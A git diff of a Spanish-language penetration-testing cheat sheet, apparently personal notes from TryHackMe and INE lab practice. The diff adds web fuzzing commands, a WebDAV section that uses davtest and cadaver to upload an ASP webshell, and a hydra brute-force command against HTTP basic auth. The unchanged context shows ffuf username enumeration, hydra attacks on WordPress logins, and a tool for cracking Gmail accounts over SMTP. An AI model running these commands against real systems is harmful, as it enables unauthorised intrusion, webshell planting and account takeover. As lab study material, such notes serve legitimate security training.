@@ -114,13 +114,21 @@ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHO
 ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists" --> Username enumeration with ffuf
 ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "host:FUZZ.empline.thm" -u 'http://empline.thm/' -fs 14058 --> escaneo de subdominios
 
-dirb http://IP /path/to/wordlist
+dirb http://IP /path/to/wordlist --> fuzzing básico
+
+dirb http://target1.ine.local -u user:password --> fuzzing a web que previmiente pide credenciales
 
 dirsearch -u http://[IP]/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 150 -e php,txt,html -f
 
 Si para acceder al sitio web salta un cuadro emergente pidiendo credenciales y las conocemos, para fuzzear esa parte a la que accedemos despues del login:
     dirb http://[IP]/ -u user:password
 
+WEBDAV
+.......
+
+davtest -auth bob:password_123321 -url http://[URL]/webdav --> escanear vulns/subida archivos a una web con plugin webdav 
+cadaver http://[URL]/webdav --> entrar en el webdav
+      put /usr/share/webshells/asp/webshell.asp --> subir una webshell en el webdav una vez entrado con cadaver
 
 REVERSE SHELL
 .............
@@ -372,6 +380,7 @@ hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]
      Ejemplo: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
      Ejemplo: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' --> Panel wordpress que no muestra error y redirecciona
 
+hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get / --> Cuando no es un panel login si no una ventana emergente pidiendo credenciales antes de acceder a la web
 python brut3k1t.py -s smtp -a smtp.gmail.com -u test@gmail.com -w word list.txt -p 25 -d 3 --> Cracking email test@gmail.com con wordlist.txt en el puerto 25 con un retraso de 3 segundos. 
      more... https://noticiasseguridad.com/hacking-incidentes/realiza-ataques-de-fuerza-bruta-ssh-smtp-facebook-e-instagram-brut3k1t/
 
